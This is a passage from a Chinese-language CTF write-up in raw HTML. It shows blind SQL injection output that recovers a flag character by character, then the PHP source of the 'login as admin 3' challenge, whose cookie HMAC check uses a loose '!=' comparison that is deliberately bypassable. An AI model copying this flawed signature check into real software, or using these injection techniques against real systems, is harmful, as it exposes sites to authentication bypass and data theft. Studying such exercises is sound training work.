</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>14: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>15: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You f
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>16: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You fo
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>17: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You fou
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>18: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You foun
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>19: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>20: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>21: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found t
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>22: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found th
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>23: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>24: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>25: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the c
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>26: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the co
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>27: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the cor
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>28: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the corr
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>29: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the corre
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>30: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correc
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>31: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>32: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>33: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct t
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>34: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct ta
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>35: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct tab
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>36: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct tabl
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>37: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>38: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>39: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table a
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>40: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table an
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span>41: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span>42: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span>43: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and t
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span>44: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and th
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span>45: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span>46: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span>47: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the f
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span>48: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the fl
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span><span>49: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the fla
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span><span>50: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the flag
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span><span>51: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the flag,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span>52: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the flag, 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span><span>53: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the flag, a
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span><span>54: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the flag, an
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span><span>55: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the flag, and
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span><span>56: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the flag, and 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span><span>57: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the flag, and U
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span><span>58: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the flag, and Us
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59</span><span>59: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the flag, and Use
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60</span><span>60: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the flag, and User
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61</span><span>61: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the flag, and UserA
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62</span><span>62: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the flag, and UserAg
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63</span><span>63: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the flag, and UserAge
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64</span><span>64: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the flag, and UserAgen
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65</span><span>65: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the flag, and UserAgent
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66</span><span>66: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You found the correct table and the flag, and UserAgent<span style=color:#ff6ac1>}</span>
</span></span></code></pre></div><p>這題 Flag 也太長了吧&mldr; 網路不好，等很久&mldr; (<del>一定是故意的</del>)<br>總之這題就是&mldr; <code>Blind-Injection</code>，然後很費時。</p><p>Flag: <code>FLAG{W0W, You found the correct table and the flag, and UserAgent}</code></p><hr><h2 class="relative group">25. <a href=https://ctf.hackme.quest/login3 target=_blank>login as admin 3</a><div id=25-login-as-admin-3httpsctfhackmequestlogin3 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#25-login-as-admin-3httpsctfhackmequestlogin3 aria-label=定位點>#</a></span></h2><blockquote><p>login as admin</p></blockquote><p>接下來幾題都沒有提示，由於沒有方向，就去看它的<code>source code</code>來找洞解。</p><p>Source code:</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-phtml data-lang=phtml><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1</span><span><span style=color:#78787e>&lt;?php</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2</span><span><span style=color:#ff6ac1>require</span>(<span style=color:#5af78e>&#39;users_db.php&#39;</span>); <span style=color:#78787e>// $users
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3</span><span><span style=color:#78787e></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4</span><span><span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;show_source&#39;</span>] <span style=color:#ff6ac1>===</span> <span style=color:#5af78e>&#39;1&#39;</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5</span><span>    highlight_file(<span style=color:#ff9f43>__FILE__</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6</span><span>    <span style=color:#ff6ac1>exit</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9</span><span><span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;logout&#39;</span>] <span style=color:#ff6ac1>===</span> <span style=color:#5af78e>&#39;1&#39;</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10</span><span>    setcookie(<span style=color:#5af78e>&#39;user&#39;</span>, <span style=color:#5af78e>&#39;&#39;</span>, <span style=color:#ff9f43>0</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11</span><span>    header(<span style=color:#5af78e>&#39;Location: ./&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14</span><span><span style=color:#ff6ac1>function</span> <span style=color:#57c7ff>set_user</span>(<span style=color:#ff5c57>$user_data</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15</span><span>{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16</span><span>    <span style=color:#ff6ac1>global</span> <span style=color:#ff5c57>$user</span>, <span style=color:#ff5c57>$secret</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18</span><span>    <span style=color:#ff5c57>$user</span> <span style=color:#ff6ac1>=</span> [<span style=color:#ff5c57>$user_data</span>[<span style=color:#5af78e>&#39;name&#39;</span>], <span style=color:#ff5c57>$user_data</span>[<span style=color:#5af78e>&#39;admin&#39;</span>]];
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20</span><span>    <span style=color:#ff5c57>$data</span> <span style=color:#ff6ac1>=</span> json_encode(<span style=color:#ff5c57>$user</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21</span><span>    <span style=color:#ff5c57>$sig</span> <span style=color:#ff6ac1>=</span> hash_hmac(<span style=color:#5af78e>&#39;sha512&#39;</span>, <span style=color:#ff5c57>$data</span>, <span style=color:#ff5c57>$secret</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22</span><span>    <span style=color:#ff5c57>$all</span> <span style=color:#ff6ac1>=</span> base64_encode(json_encode([<span style=color:#5af78e>&#39;sig&#39;</span> <span style=color:#ff6ac1>=&gt;</span> <span style=color:#ff5c57>$sig</span>, <span style=color:#5af78e>&#39;data&#39;</span> <span style=color:#ff6ac1>=&gt;</span> <span style=color:#ff5c57>$data</span>]));
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23</span><span>    setcookie(<span style=color:#5af78e>&#39;user&#39;</span>, <span style=color:#ff5c57>$all</span>, time()<span style=color:#ff6ac1>+</span><span style=color:#ff9f43>3600</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26</span><span><span style=color:#ff5c57>$error</span> <span style=color:#ff6ac1>=</span> <span style=color:#ff6ac1>null</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28</span><span><span style=color:#ff6ac1>function</span> <span style=color:#57c7ff>load_user</span>()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29</span><span>{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30</span><span>    <span style=color:#ff6ac1>global</span> <span style=color:#ff5c57>$secret</span>, <span style=color:#ff5c57>$error</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32</span><span>    <span style=color:#ff6ac1>if</span>(<span style=color:#ff6ac1>empty</span>(<span style=color:#ff5c57>$_COOKIE</span>[<span style=color:#5af78e>&#39;user&#39;</span>])) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33</span><span>        <span style=color:#ff6ac1>return</span> <span style=color:#ff6ac1>null</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36</span><span>    <span style=color:#ff5c57>$unserialized</span> <span style=color:#ff6ac1>=</span> json_decode(base64_decode(<span style=color:#ff5c57>$_COOKIE</span>[<span style=color:#5af78e>&#39;user&#39;</span>]), <span style=color:#ff6ac1>true</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37</span><span>    <span style=color:#ff5c57>$r</span> <span style=color:#ff6ac1>=</span> hash_hmac(<span style=color:#5af78e>&#39;sha512&#39;</span>, <span style=color:#ff5c57>$unserialized</span>[<span style=color:#5af78e>&#39;data&#39;</span>], <span style=color:#ff5c57>$secret</span>) <span style=color:#ff6ac1>!=</span> <span style=color:#ff5c57>$unserialized</span>[<span style=color:#5af78e>&#39;sig&#39;</span>];
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39</span><span>    <span style=color:#ff6ac1>if</span>(hash_hmac(<span style=color:#5af78e>&#39;sha512&#39;</span>, <span style=color:#ff5c57>$unserialized</span>[<span style=color:#5af78e>&#39;data&#39;</span>], <span style=color:#ff5c57>$secret</span>) <span style=color:#ff6ac1>!=</span> <span style=color:#ff5c57>$unserialized</span>[<span style=color:#5af78e>&#39;sig&#39;</span>]) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40</span><span>        <span style=color:#ff5c57>$error</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;Invalid session&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41</span><span>        <span style=color:#ff6ac1>return</span> <span style=color:#ff6ac1>false</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44</span><span>    <span style=color:#ff5c57>$data</span> <span style=color:#ff6ac1>=</span> json_decode(<span style=color:#ff5c57>$unserialized</span>[<span style=color:#5af78e>&#39;data&#39;</span>], <span style=color:#ff6ac1>true</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45</span><span>    <span style=color:#ff6ac1>return</span> [
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46</span><span>        <span style=color:#5af78e>&#39;name&#39;</span> <span style=color:#ff6ac1>=&gt;</span> <span style=color:#ff5c57>$data</span>[<span style=color:#ff9f43>0</span>],
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47</span><span>        <span style=color:#5af78e>&#39;admin&#39;</span> <span style=color:#ff6ac1>=&gt;</span> <span style=color:#ff5c57>$data</span>[<span style=color:#ff9f43>1</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48</span><span>    ];
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51</span><span><span style=color:#ff5c57>$user</span> <span style=color:#ff6ac1>=</span> load_user();
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53</span><span><span style=color:#ff6ac1>if</span>(<span style=color:#ff6ac1>!</span><span style=color:#ff6ac1>empty</span>(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;name&#39;</span>]) <span style=color:#ff6ac1>&amp;&amp;</span> <span style=color:#ff6ac1>!</span><span style=color:#ff6ac1>empty</span>(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;password&#39;</span>])) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54</span><span>    <span style=color:#ff5c57>$user</span> <span style=color:#ff6ac1>=</span> <span style=color:#ff6ac1>false</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55</span><span>    <span style=color:#ff6ac1>foreach</span>(<span style=color:#ff5c57>$users</span> <span style=color:#ff6ac1>as</span> <span style=color:#ff5c57>$u</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56</span><span>        <span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$u</span>[<span style=color:#5af78e>&#39;name&#39;</span>] <span style=color:#ff6ac1>===</span> <span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;name&#39;</span>] <span style=color:#ff6ac1>&amp;&amp;</span> <span style=color:#ff5c57>$u</span>[<span style=color:#5af78e>&#39;password&#39;</span>] <span style=color:#ff6ac1>===</span> <span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;password&#39;</span>]) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57</span><span>            set_user(<span style=color:#ff5c57>$u</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58</span><span>        }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61</span><span><span style=color:#78787e>?&gt;&lt;!DOCTYPE html&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62</span><span>&lt;<span style=color:#ff6ac1>html</span> <span style=color:#57c7ff>lang</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63</span><span>&lt;<span style=color:#ff6ac1>head</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64</span><span>    &lt;<span style=color:#ff6ac1>meta</span> <span style=color:#57c7ff>charset</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65</span><span>    &lt;<span style=color:#ff6ac1>title</span>&gt;Login As Admin 3&lt;/<span style=color:#ff6ac1>title</span>&gt;
